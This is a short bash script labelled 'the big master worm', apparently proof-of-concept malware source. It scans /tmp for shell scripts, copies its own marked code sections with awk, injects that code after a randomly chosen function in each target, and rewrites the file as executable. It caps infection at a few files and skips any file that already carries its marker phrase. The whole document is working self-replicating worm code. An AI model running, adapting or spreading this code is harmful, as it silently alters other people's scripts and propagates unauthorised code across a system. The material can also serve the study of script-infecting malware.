#!/bin/bash
#
# bmw - the big master worm
#
# v320  by wzt	2019
#

# bmw_phase1_start
infect_dir="/tmp"
infect_size=10
infect_line=4
infect_max_num=4
infect_num=0
infect_func_num=2
infect_self_num=3
infect_self_name=""
infect_key_words="the big master worm."

bmw_find_scripts()
{
	local file file_sz func_num

	for file in `find $infect_dir -name "*.sh"`
	do
		[ $infect_num -gt $infect_max_num ] && break

		file_sz=`wc -c $file |awk '{print $1}'`
		file_line=`wc -l $file |awk '{print $1}'`

		[[ $file_sz -lt $infect_size || $file_line -lt $infect_line ]] && continue 

		func_num=`grep '^[a-zA-Z0-9_][^"]*()' $file|wc -l`
		[ $func_num -lt $infect_func_num ] && continue

		if grep "$infect_key_words" $file >/dev/null; then
			echo "$file has been infected."
			continue
		fi
		echo "<$file_sz $file_line $func_num> infecting $file..."
		bmw_infect_file $1 $file $func_num
		((infect_num++))
	done
}
# bmw_phase1_end

# bmw_phase2_start
bmw_infect_file()
{
	local rand_num i j k l
	local phase_s phase_e

	rand_num=$((RANDOM%$3))
	if [ $rand_num -eq 0 ]; then
		rand_num=1
	fi

	echo "$3 => $rand_num $2"

	phase_s="bmw_phase1_start"
	phase_e="bmw_phase$infect_self_num""_end"

	bmw_extract_body "$1" "$phase_s" "$phase_e" "$2" $rand_num
}

bmw_extract_body()
{
	local shellcode newcode

        shellcode=`awk -v phase_start="$2" -v phase_end="$3" 'BEGIN {phase_flag=0;phase_len=0}{if (phase_flag == 1) {phase_array[phase_len]=$0;phase_len++}if ($0 ~ phase_start) {phase_flag=1;phase_array[phase_len]=$0;phase_len++}if ($0 ~ phase_end) {phase_flag=0;}}END {for (i = 0; i < phase_len; i++) print phase_array[i]}' $1`

	shellcode1=$(echo "$shellcode"|sed 's/\\/\\\\/g')
	newcode=`awk -v scode="$shellcode1" -v tnum="$5" 'BEGIN {func_flag=0;func_num=0}	{if (func_flag == 1) {print $0;	if ($0 ~ /^\}/) {func_flag=0;print scode}}else {if ($0 ~ /^[[:alnum:]].*\(\)/) {func_num++;if (func_num == tnum) {func_flag=1;}}print $0}}' $4`

	#echo -e "$newcode" >$4.bak
	echo -e "$newcode"|sed 's/\\/\\\\/g' >$4.bak
	rm -f $4 && mv $4.bak $4
	chmod +x $4
}
# bmw_phase2_end

# bmw_phase3_start
bmw_find_scripts $0
# bmw_phase3_end
